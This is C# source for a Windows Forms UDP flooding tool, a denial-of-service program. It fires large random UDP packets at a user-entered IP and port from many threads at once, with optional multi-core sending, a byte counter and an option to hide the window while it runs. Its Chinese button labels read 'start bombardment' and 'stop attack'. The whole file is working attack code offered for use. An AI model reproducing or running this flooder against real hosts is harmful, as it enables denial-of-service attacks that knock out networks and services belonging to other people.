using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace UDP_Flooder
{
    public partial class MainForm : Form
    {
        private const int MAX_SIZE = 65500;

        private bool isEnable;
        private int size;
        private long sizeCount;
        private readonly byte[] send;
        private readonly IList<Thread> floodThread;
        private readonly ThreadLocal<Random> random;

        public MainForm()
        {
            InitializeComponent();
            floodThread = new List<Thread>();
            random = new ThreadLocal<Random>(() => new Random());

            send = new byte[MAX_SIZE];
            random.Value.NextBytes(send);
        }

        private void enableByteCounterToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (enableByteCounterToolStripMenuItem.Checked)
            {
                btnClear.Visible = true;
                labelByteCounter.Visible = true;
            }
            else
            {
                btnClear.Visible = false;
                labelByteCounter.Visible = false;
            }
        }

        private void flood(string ip, int port)
        {
            int packet = Convert.ToInt32(numPacket.Value);
            int delay = Convert.ToInt32(numDelay.Value);

            UdpClient client = new UdpClient(ip, port);
            while (isEnable)
            {
                int sendLength = getSize();
                if (!enableMultiCoreToolStripMenuItem.Checked)
                {
                    for (int i = 1; i <= packet && isEnable; ++i)
                    {
                        try
                        {
                            client.Send(send, sendLength);
                            if (enableByteCounterToolStripMenuItem.Checked)
                            {
                                modifyByteCounter(sendLength);
                            }
                        }
                        catch
                        {
                        }
                    }
                }
                else
                {
                    Parallel.For(0, packet, i =>
                    {
                        if (isEnable)
                        {
                            try
                            {
                                client.Send(send, sendLength);
                                if (enableByteCounterToolStripMenuItem.Checked)
                                {
                                    modifyByteCounter(sendLength);
                                }
                            }
                            catch
                            {
                            }
                        }
                    });
                }
                Thread.Sleep(delay);
            }
        }

        private int getSize()
        {
            if (chkRandomSize.Checked)
            {
                return random.Value.Next(1, MAX_SIZE + 1);
            }
            else
            {
                return size;
            }
        }

        private void init()
        {
            int count = Convert.ToInt32(numThread.Value);
            int port = int.Parse(txtPort.Text);

            for (int i = 1; i <= count; ++i)
            {
                Thread thread = new Thread(() => flood(txtIP.Text, port));
                floodThread.Add(thread);
                thread.Start();
            }
        }

        public static bool validateIPv4(string ipString)
        {
            if (string.IsNullOrWhiteSpace(ipString))
            {
                return false;
            }

            string[] splitValue = ipString.Split('.');
            if (splitValue.Length != 4)
            {
                return false;
            }

            byte parse;
            return splitValue.All(result => byte.TryParse(result, out parse));
        }

        private void waitThread()
        {
            foreach (Thread thread in floodThread)
            {
                while (thread.ThreadState != ThreadState.Stopped)
                {
                    Thread.Sleep(1000);
                }
            }
            floodThread.Clear();

            Invoke((MethodInvoker)delegate
            {
                processControl(false);
                btnAttack.Enabled = true;
            });
        }

        private void btnAttack_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtIP.Text))
            {
                MessageBox.Show("請輸入 IP 位址");
                return;
            }

            if (string.IsNullOrWhiteSpace(txtPort.Text))
            {
                MessageBox.Show("請輸入端口");
                return;
            }

            if (!validateIPv4(txtIP.Text))
            {
                try
                {
                    Dns.GetHostEntry(txtIP.Text);
                }
                catch
                {
                    MessageBox.Show("輸入主機位址錯誤");
                    return;
                }
            }

            try
            {
                int port = int.Parse(txtPort.Text);
                if (port <= 0 || port > 65535)
                {
                    MessageBox.Show("輸入端口錯誤");
                    return;
                }
            }
            catch
            {
                MessageBox.Show("輸入端口必須是數字");
                return;
            }

            bool status = !isEnable;
            btnAttack.Text = status ? "停止攻擊" : "開始轟炸";
            if (status)
            {
                processControl(status);
                isEnable = status;
                if (disappearWhenStartToolStripMenuItem.Checked)
                {
                    Hide();
                }
                size = trackBarSize.Value;
                init();
            }
            else
            {
                btnAttack.Enabled = status;
                isEnable = status;
                new Thread(waitThread).Start();
            }
        }

        private void btnClearCount_Click(object sender, EventArgs e)
        {
            Interlocked.Exchange(ref sizeCount, 0);
        }

        private void updateSizeControl()
        {
            trackBarSize.Enabled = txtSize.Enabled = !chkRandomSize.Checked;
        }

        private void chkRandomSize_CheckedChanged(object sender, EventArgs e)
        {
            updateSizeControl();
        }

        private void Form_Resize(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized && minToTaskBarToolStripMenuItem.Checked)
            {
                Hide();
                notifyIcon.Visible = true;
            }
        }

        private void modifyByteCounter(int length)
        {
            Interlocked.Add(ref sizeCount, length);
        }

        private void notifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            notifyIcon.Visible = false;
            Show();
        }

        private void processControl(bool attack)
        {
            txtIP.Enabled = !attack;
            txtPort.Enabled = !attack;
            if (attack)
            {
                trackBarSize.Enabled = false;
                txtSize.Enabled = false;
                chkRandomSize.Enabled = false;
            }
            else
            {
                chkRandomSize.Enabled = true;
                updateSizeControl();
            }
            numThread.Enabled = !attack;
            numDelay.Enabled = !attack;
            numPacket.Enabled = !attack;
            disappearWhenStartToolStripMenuItem.Enabled = !attack;
            enableMultiCoreToolStripMenuItem.Enabled = !attack;
        }

        private void trackBarSize_Scroll(object sender, EventArgs e)
        {
            txtSize.Text = trackBarSize.Value.ToString();
        }

        private void txtSize_TextChanged(object sender, EventArgs e)
        {
            txtSize.Text = Regex.Replace(txtSize.Text, @"\s+", string.Empty);
            try
            {
                int value = int.Parse(txtSize.Text);
                if (value < 1)
                {
                    trackBarSize.Value = 1;
                    txtSize.Text = "1";
                }
                else if (value > MAX_SIZE)
                {
                    trackBarSize.Value = MAX_SIZE;
                    txtSize.Text = MAX_SIZE.ToString();
                }
                else
                {
                    trackBarSize.Value = value;
                }
            }
            catch
            {
                trackBarSize.Value = 1;
                txtSize.Text = "1";
            }
        }

        private void timerSizeCount_Tick(object sender, EventArgs e)
        {
            labelByteCounter.Text = "已傳送位元組 : " + Interlocked.Read(ref sizeCount);
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(Environment.ExitCode);
        }
    }
}